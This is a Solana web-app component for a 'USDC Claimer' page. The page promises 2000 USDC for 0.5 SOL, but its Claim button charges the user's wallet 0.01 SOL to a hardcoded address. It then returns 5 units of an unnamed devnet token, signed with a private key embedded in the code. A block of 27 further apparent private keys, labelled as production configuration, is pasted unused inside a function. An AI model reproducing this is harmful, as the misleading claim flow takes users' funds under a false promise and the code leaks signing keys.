/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3ipbPGk7eXMvsfCQqM2GDn2D2eDeDarW4yiEFGeCcffmsizL7ipngHhNmqxjzMDboD7bEbCwkhnehEh6xhaow2nY"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2bZcjv3nZkw4WNJvPoujWiEpHQeGcp1DpYbpBLZijDwsATvYZS4eXANopk5HyQHuqsLakkq8iia9yjUHgyjUiKoS",
  "key1": "4BrWqbw4niWX6AHmSsGv8iBqJENNXVZR3XsSndi52YT4EuBmaqThVhJJoj6F2igL5ZHSqYMVcZS3FAV657WJAfFS",
  "key2": "3SYFrnfiCJJ692qab2cLKwtQS9C34Buon7kT2KjX6bF2ZaQdja8dmNY7g5to7sCitmNHovv1VgH964tAD5efHnpN",
  "key3": "3LjETATcQuSF5gPndCW2maqJ9sXLjVbdDgLCTwTb6j9wqzg46hKPQBYhkkMgix89VYPEbe9TzVwAGF7F6vV6eAgk",
  "key4": "4moXRLcRc5u6nem4T9kkgripBYN7gryZSLijTPiakLUi1jDtjm5EYqAWTw5gQmMLRzBk6XgqQX6gg7kKQm1UbBAg",
  "key5": "4bY6Ntavpb6kD49EYSjH8x9h2favHGHhhZaPfghyDfh4vdfLuycKC6mXfjiE6UcnthmSkvaRvtZtVn8tS44W6XT2",
  "key6": "R3M4SrDePRA82cQqprowFBmEUyAyFfTMFUB3ptAVUvmF2e5R4bAYZuVP6Y4KXP65KVkmdxKw5wGUTzVp7b6zeqc",
  "key7": "4RdgF8Lqp6qsjQGSNL56E8caAibhnoT57ybUSxWyfYi5Qgke5hUEaWdydGeuiY81DTdtuqkL7rDkuqGpVjRGNLx8",
  "key8": "2LqY1G3q81yXoVcN9zTNn5thvQqv7KK47nn1ujQH4jdHwNB86zV7DU37hoTtw8diMByvKXMqj2kKXd6gZ99BZATz",
  "key9": "aVuzLNm7viFGh4kXiEqapfGgGaZ1DtvQ89eNG59Nfn8yDgf9d94W5dDQoKeMwgrpAXZSXaDbikbDsStmD6gsNRH",
  "key10": "3nX9MWAEszJdzP5rjakMdWpskawwzkeee8zoFiKLwRs4N384vqM5bmM6UPZpsXjAMpQkC2tdMWWC9m2BZUpLKHh8",
  "key11": "4xoe4kaBMF4PtJumQhuejTqyM7LCUEkciKqJFfNRaKccXpSMrq8uXNRVbG5khp5XifskoXRibKZvNY21aAMArqxy",
  "key12": "3gowbcxdSoeWK4xAsUgNpbMwQQVZbzw4koZxVwG6RsjTV2RFwycbrjxYLWW5tQZeCr1uNGZpLabBkTm3Xo9tR4yr",
  "key13": "2THYVArPQ83XTRgTtvmctKm9geUn4uTvhJPPyzyoUF5Co9EFi1J4BKFWVLMmEyESbKahDAozoMvY5wGdZzfXqaUw",
  "key14": "XTxwsZTEKkUEeT94zkcaGLHLcbdWk13dLJ4z5Cks9Vh2Vat6HQefSa2mVSmPbnwnJTR85VBNpezEAiX1MG1xD39",
  "key15": "3jUtjY63f2rBrYLoaoW3G5gAQRWeVsRwhdpSCFhJHDprCGY6o8uTXgAGGANZM5UScE4B3pzj2nniTAmnBj2j3AA1",
  "key16": "qXtHsRNzDpDdL1yB7USuP6fMzVdKyrptnR3GhhimNFZVJXbmyMuhG5XxMGgKoqa8mTs977PhncNsTg5KBpNAfbG",
  "key17": "nBxZEMxEy89SdEPaPDHN8tRt3bTaxafN75SwiyucdGvdHzRh17HAunWTqExfhVegYNFc9GbPZFzqVVHMEmF1yGX",
  "key18": "24cGihCAxjHwj3SfyLbk2vssj6nTpf5zc5sctJL4j6CHhgVhS7xpASDuxYedbmNSH4zNrCnkJ9exnNNqGqVUqtLQ",
  "key19": "MaPPgZ2TT5t8m33g4GuphataHDsRnhZxBcpC1fuEcchHPVCLt6MMrc5GafnfLQ7TEQB4qJxkLeaEistn18uZoB7",
  "key20": "4T6gQBTmGwY1vzknHwAkvSQFwb9hh1aDNnhXiriuC3jgognWj8gqytvBEikoBxWjinj9L4WNRWyhKus8oXtRzHDx",
  "key21": "3C31CfyYcTDJT5SgtxtnUkSU8dJEhHXNdmvNkdxaRbkyxkvKi9X7Z8RKuQS1QA8V5ysCZS9yuCH9wzTkhyuWPpmL",
  "key22": "67pY8sZsknTT4ur7dtnhVfjbPrToXWMsNEjZq8xocmw8n2PhZzveba9XGZ6WzJMLr38SxSkXSnWGNiJXxZwdK33k",
  "key23": "4nWnveDfNapnUuSghVX9CHAdE1UoAd6WDoM6Rs333tp5jPXp4Bgi5KhkaxAx7dA4FjuiHtUjtDpuybGbVnW7x4Lg",
  "key24": "q1AQzLJTFb1MyngoZXL7hmBsWMwaFYjX8rb7a2fYTPYUGeRNKEV86xUGDFcGoismDJJFAtefYMnY4DYtWvGPtuo",
  "key25": "2Mq86nWocbk53R31rYEPHXJRn4cGD56vdBJEP4FGDLnrhByZVSFtGvZmHRYpZU7z3QihDUG6ULbbRxJRMWRLiEbh",
  "key26": "356WvQLdGSVAFxFd75kGsxRekzvcwpzowPfr5ugttWN3jajmR7jiNR3cLWWqvvaMEVcwJ769uJtZy8qBfhrjj976"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
